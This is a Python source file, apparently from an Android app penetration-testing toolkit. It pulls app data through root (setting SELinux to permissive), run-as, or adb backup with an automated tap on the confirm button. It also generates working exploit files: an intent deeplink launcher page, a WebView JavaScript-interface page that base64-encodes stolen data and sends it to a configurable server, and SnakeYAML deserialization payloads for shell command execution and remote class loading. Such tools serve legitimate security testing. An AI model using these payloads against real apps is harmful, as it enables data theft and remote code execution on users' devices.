import subprocess
from subprocess import DEVNULL, PIPE
import threading
from time import sleep
import time
from colorama import Fore
import os
import re

from Classes.commands import Commands
from .constants import Constants

class OtherTools:
    id: str
    _config: dict

    @property
    def config(self):
        return self._config

    @config.setter
    def config(self, data):
        self._config = data

    def __init__(self, low_power_mode=False) -> None:
        self.low_power_mode = low_power_mode
        self._config = {
            "app": "",
            "path": Constants.DIR_LOOT_DATA.value,
            "password": ""

        }
        self._generate_deeplink_data = {
            "server": "http://127.0.0.1:8000/",
            "filename": "steal.html",
            "scheme": "deeplink",
            "package": "com.example.com",
            "component": "com.example.com/.WebViewActivity",
            "deeplink_uri": "host.com",
            "param": "url",
            "js_interface": "readFlag",
            "path": Constants.DIR_LOOT_PATH.value,
            "poc_filename": "launch.html"
        }
        self._generate_deeplink_data_d = {
            "scheme": "deeplink",
            "package": "com.example.com",
            "component": "com.example.com/.WebViewActivity",
            "deeplink_uri": "host.com",
            "extras": [],
            "path": Constants.DIR_LOOT_PATH.value
        }

        self.snake_data = {
            "type": "write_to_sd",
            "path": Constants.DIR_LOOT_PATH.value,
            "filename": "snake_poc.yml",
            "mal_url": "http://localhost:8080",
            "cmd": 'touch /sdcard/command-executed.txt && echo \'RCE successful\' > /sdcard/command-executed.txt',
            "app_name": "com.example.android",
            "exec_mode": "push_to_sd",
            "component": "com.example.android.MainActivity"
        }

        self._snakeyml_payload = {
            "write_to_sd": 'some_var: !!java.io.FileOutputStream ["/sdcard/yaml-rce-proof.txt"]',
            "exec_cmd": f'some_var: !!java.lang.ProcessBuilder ["/system/bin/sh", "-c", "{self.snake_data.get("cmd")}"]',
            "oob": f'some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["{self.snake_data.get("mal_url")}"]]]]'
        }

        self._deeplink = ""
        self.backup_files = {}
        self._init_backup_constants()
        self._init_tools()
    
    def open_deeplink(self):
        final_command = f'{Constants.ADB.value} shell am start -d {self._deeplink}'.split()
        print(Commands.LAUNCH_DEEPLINK.value["display"] + "\nCommand used: " + f'{Constants.ADB.value} shell am start -d {self._deeplink}' + Fore.RESET)
        output = subprocess.run(final_command, stdout=DEVNULL, stderr=PIPE).stderr.decode()
        if "exception in module" in output:
            print(Fore.RED + "[-] No Activity found to handle Intent { act=android.intent.action.VIEW dat="+ self._deeplink + " flg=0x10000000 (has extras) }" + Fore.RESET)

    def _init_backup_constants(self):
        self._abe = f'java -jar {os.path.join(Constants.DIR_UTILS_PATH.value, "abe.jar")}'
        self.backup_files["restore_tar"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.NEWBACKUP_NAME_TAR.value)
        self.backup_files["new_backup_ab"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.NEWBACKUP_NAME.value)
        self.backup_files["backup_ab_location"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.BACKUP_NAME.value)
        self.backup_files["package_list"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.PCKLIST_NAME.value)
        self.backup_files["backup_tar_location"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.BACKUP_COMPRESSED_NAME.value)
        os.makedirs(os.path.dirname(self.backup_files["restore_tar"]), exist_ok=True)

    def _init_tools(self):
        # Define the command to run ABE
        abe_command = self._abe.split()

        # Function to read and print a stream
        def read_and_store_stream(stream, label, output_list):
            for line in stream:
                if isinstance(line, bytes):
                    line = line.decode().strip()
                output_list.append(line)

        try:
            # Start the ABE process
            process = subprocess.Popen(abe_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

            # Create threads to capture and print stdout and stderr
            stdout_output, stderr_output = [], []
            stdout_thread = threading.Thread(target=read_and_store_stream, args=(process.stdout, "stdout", stdout_output))
            stderr_thread = threading.Thread(target=read_and_store_stream, args=(process.stderr, "stderr", stderr_output))

            # Start the threads
            stdout_thread.start()
            stderr_thread.start()

            # Wait for the process to complete
            process.wait()

            # Wait for the threads to finish
            stdout_thread.join()
            stderr_thread.join()

            # Check if "usage" is present in the output
            combined_output = "\n".join(stdout_output + stderr_output)
            if "usage" in combined_output.lower():
                print(Fore.BLUE + '[*] ABE is running!' + Fore.RESET)
            else:
                print(Fore.RED + '[-] AndroidBackupExtractor is missing. Install the abe.jar file... Exiting... ' + Fore.RESET)
                quit()

        except FileNotFoundError as e:
            # The ABE executable or JAR file was not found
            print(Fore.RED + '[-] AndroidBackupExtractor executable or JAR file not found:' + str(e) + Fore.RESET)
        except Exception as e:
            print(Fore.RED + '[-] An error occurred: ', str(e) + Fore.RESET)

    # Get package list
    def get_package_list(self):
        cmd_get_package_list = f'tar tf {self.backup_files["backup_tar_location"]}'
        p = subprocess.run(cmd_get_package_list.split(), stderr=PIPE, stdout=PIPE)
        out = p.stdout.decode().splitlines()
        with open(self.backup_files["package_list"], 'w') as f:
            f.writelines(out)

    def extract_backup(self, method="legacy"):
        """Extract backup - supports multiple methods"""
        package = self.config["app"]
        output_path = self.config["path"]
        
        # Method 1: Rooted
        if method == "rooted":
            print(Fore.YELLOW + "[*] Extracting via root..." + Fore.RESET)
            check_cmd = f"{Constants.ADB.value} shell su -c id"
            if "uid=0" not in subprocess.run(check_cmd.split(), capture_output=True, text=True).stdout:
                print(Fore.RED + "[-] Root not available" + Fore.RESET)
                return False
            
            selinux_cmd = f"{Constants.ADB.value} shell getenforce"
            if "Enforcing" in subprocess.run(selinux_cmd.split(), capture_output=True, text=True).stdout:
                subprocess.run(f"{Constants.ADB.value} shell su -c 'setenforce 0'".split(), stderr=PIPE, stdout=PIPE)
            
            os.makedirs(output_path, exist_ok=True)
            tar_file = os.path.join(output_path, f"{package}.tar")
            tar_cmd = f"{Constants.ADB.value} shell su -c 'tar -cf - /data/data/{package}'"
            
            with open(tar_file, "wb") as f:
                p = subprocess.Popen(tar_cmd, shell=True, stdout=subprocess.PIPE)
                f.write(p.communicate()[0])
            
            extract_dir = os.path.join(output_path, package)
            os.makedirs(extract_dir, exist_ok=True)
            subprocess.run(f"tar -xf {tar_file} -C {extract_dir} --strip-components=3".split(), stderr=PIPE, stdout=PIPE)
            print(Fore.GREEN + f"[+] Extracted to {extract_dir}" + Fore.RESET)
            self.get_package_list()
            return True
        
        # Method 2: run-as
        elif method == "runas":
            print(Fore.YELLOW + "[*] Extracting via run-as..." + Fore.RESET)
            check_cmd = f"{Constants.ADB.value} shell run-as {package} id"
            if subprocess.run(check_cmd.split(), capture_output=True).returncode != 0:
                print(Fore.RED + "[-] App is not debuggable" + Fore.RESET)
                return False
            
            os.makedirs(output_path, exist_ok=True)
            tar_file = os.path.join(output_path, f"{package}.tar")
            tar_cmd = f"{Constants.ADB.value} shell 'run-as {package} tar -c .'"
            
            with open(tar_file, "wb") as f:
                p = subprocess.Popen(tar_cmd, shell=True, stdout=subprocess.PIPE)
                f.write(p.communicate()[0])
            
            extract_dir = os.path.join(output_path, package)
            os.makedirs(extract_dir, exist_ok=True)
            subprocess.run(f"tar -xf {tar_file} -C {extract_dir}".split(), stderr=PIPE, stdout=PIPE)
            print(Fore.GREEN + f"[+] Extracted to {extract_dir}" + Fore.RESET)
            self.get_package_list()
            return True
        
        # Method 3: Legacy
        else:
            threading.Thread(target=self._auto_confirm_backup, daemon=True).start()
            self._init_backup_constants()
            cmd = f'{Constants.ADB.value} backup -f {self.backup_files["backup_ab_location"]} {self.config["app"]}'
            p = subprocess.run(cmd.split(), stderr=PIPE, stdout=PIPE)
            time.sleep(5)
            cmd_unpack = f'{self._abe} unpack {self.backup_files["backup_ab_location"]} {self.backup_files["backup_tar_location"]} {self.config["password"]}'
            p = subprocess.run(cmd_unpack.split(), stderr=PIPE, stdout=PIPE)
            cmd_untar = f'tar -C {self.config["path"]} -xf {self.backup_files["backup_tar_location"]}'
            p = subprocess.run(cmd_untar.split(), stderr=PIPE, stdout=PIPE)
            self.get_package_list()
            print(Fore.GREEN + f"[+] Extracted to {self.config['path']}" + Fore.RESET)
            return True


    def restore_backup(self):
        if not os.path.isfile(self.backup_files["package_list"]):
            self.get_package_list()
        cmd_tar = f'tar cf {self.backup_files["restore_tar"]} -T {self.backup_files["package_list"]}'
        p = subprocess.run(cmd_tar.split(), stderr=PIPE, stdout=PIPE)
        # check for errors
        cmd_pack = f'{self._abe} pack {self.backup_files["restore_tar"]} {self.backup_files["new_backup_ab"]} {self.config["password"]}'
        p = subprocess.run(cmd_pack.split(), stderr=PIPE, stdin=PIPE)
        # check for errors
        cmd = f'adb restore {self.backup_files["new_backup_ab"]}'
        p = subprocess.run(cmd.split(), stderr=PIPE, stdin=PIPE)
        # check for errors
        
    def generate_jsinterface(self):
        self._html_poc = {
            "chrome": f"""
        <html>
            <title> Automatic launch of deeplink </title>
            <body>
                <script>
                    window.location.href="intent://{self._generate_deeplink_data['deeplink_uri']}?{self._generate_deeplink_data['param']}={self._generate_deeplink_data['server']}{self._generate_deeplink_data['filename']}#Intent;scheme={self._generate_deeplink_data['scheme']};package={self._generate_deeplink_data['package']};component={self._generate_deeplink_data['component']};end";
                </script>    
            </body>
            </html>
        """,
            "payload": f"""
            <!DOCTYPE html>
            <html>
            <body>
                <script>
                    var data = window.{self._generate_deeplink_data['js_interface']};
                        function sendBase64Value(base64Value) {{
                        const url = `{self._generate_deeplink_data['server']}?encodedValue=${{encodeURIComponent(base64Value)}}`;
                        const xhr = new XMLHttpRequest();
                        xhr.open('GET', url, true);
                        xhr.onload = function() {{
                            console.log('Request sent successfully');
                        }};
                        xhr.onerror = function() {{
                            console.error('Error sending request');
                        }};
                        xhr.send();
                    }}
                    const base64Encoded = btoa(data);
                    sendBase64Value(base64Encoded);
                </script>
                <head><title>Read sensitive data</title>
            </body>

            """
        }
        # 1. generate the first file
        with open(os.path.join(self._generate_deeplink_data["path"], self._generate_deeplink_data["filename"]), "w") as f:
            f.writelines(self._html_poc["payload"])
            print(Fore.GREEN + f'[+] Content written to file {os.path.join(self._generate_deeplink_data["path"], self._generate_deeplink_data["filename"])}' + Fore.RESET)
        # 2. generate the last file
        with open(os.path.join(self._generate_deeplink_data["path"], self._generate_deeplink_data["poc_filename"]), "w") as f:
            f.writelines(self._html_poc["chrome"])
            print(Fore.GREEN + f'[+] Content written to file {os.path.join(self._generate_deeplink_data["path"], self._generate_deeplink_data["poc_filename"])}' + Fore.RESET)
    
    def generate_deeplink(self):
        extra_strings = ""
        for extra in self._generate_deeplink_data_d["extras"]:
            extra_strings += f';{extra["type"]}.{extra["key"]}={extra["value"]}'
        poc = f"""
        <!DOCTYPE html>
        <html>
            <body>
                <a id="exploit" href="intent://{self._generate_deeplink_data_d['deeplink_uri']}#Intent;scheme={self._generate_deeplink_data_d['scheme']};package={self._generate_deeplink_data_d['package']};component={self._generate_deeplink_data_d['component']};action=android.intent.action.VIEW{extra_strings};end">Exploit</a>;
            </body>
        </html>
        """
        
        with open(os.path.join(self._generate_deeplink_data_d["path"], "exploit.html"), "w") as f:
            f.writelines(poc)
            print(Fore.GREEN + f'[+] Content written to file {os.path.join(self._generate_deeplink_data["path"], "exploit.html")}' + Fore.RESET)
    
    def generate_snakeyml_payload(self):
        full_path = os.path.join(self.snake_data["path"], self.snake_data["filename"])
        self._update_snakeyaml()
        with open(full_path, 'w') as f:
            f.write(self._snakeyml_payload[self.snake_data["type"]])
            print(Fore.GREEN + f'[+] Content written to file {full_path}' + Fore.RESET)


    def _update_snakeyaml(self):
        self._snakeyml_payload = {
            "write_to_sd": 'some_var: !!java.io.FileOutputStream ["/sdcard/yaml-rce-proof.txt"]',
            "exec_cmd": f'some_var: !!java.lang.ProcessBuilder [["/system/bin/sh", "-c", "{self.snake_data.get("cmd")}"]]',
            "oob": f'some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["{self.snake_data.get("mal_url")}"]]]]'
        }

    def execute_snakeyml_payload(self):
        full_path = os.path.join(self.snake_data["path"], self.snake_data["filename"])
        self._update_snakeyaml()
        attack_mode = self.snake_data.get("exec_mode").lower()
        if attack_mode == "push_to_sd":
            cmd = f"adb push {full_path} /sdcard"
            p = subprocess.run(cmd.split(), stderr=PIPE, stdout=PIPE)
            print(Fore.GREEN + f'[+] Content pushed to /sdcard/{self.snake_data["filename"]}' + Fore.RESET)
        elif attack_mode == "launch_deeplink":
            cmd = f'adb shell am start -a android.intent.action.VIEW -n {self.snake_data["app_name"]}/{self.snake_data["component"]} -d {self.snake_data["mal_url"]}'
            p = subprocess.run(cmd.split(), stderr=PIPE, stdout=PIPE)
            print(Fore.GREEN + f'[+] Executing {cmd}' + Fore.RESET)

    def _auto_confirm_backup(self, timeout=60):
        """
        Background helper that finds and taps the 'Back up my data' button.
        Uses only built-in adb shell commands.
        """
        adb = Constants.ADB.value
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            # 1. Dump the current UI hierarchy to a temporary file on the device
            subprocess.run(f"{adb} shell uiautomator dump /data/local/tmp/ui.xml".split(), capture_output=True)
            
            # 2. Read the XML content back to Python
            dump = subprocess.run(f"{adb} shell cat /data/local/tmp/ui.xml".split(), capture_output=True, text=True).stdout
            
            if not dump:
                time.sleep(2)
                continue

            # 3. Search for the 'Back up my data' button and capture its bounds [x1,y1][x2,y2]
            # Using (?i) for case-insensitive matching to handle different Android versions
            match = re.search(r'text="(?i)back up my data".*?bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"', dump)
            
            if match:
                x1, y1, x2, y2 = map(int, match.groups())
                # Calculate the center of the button for the tap
                center_x = (x1 + x2) // 2
                center_y = (y1 + y2) // 2
                
                # 4. Simulate the tap at the calculated coordinates
                subprocess.run(f"{adb} shell input tap {center_x} {center_y}".split())
                return True
                
            time.sleep(2)  # Wait before next attempt
        return False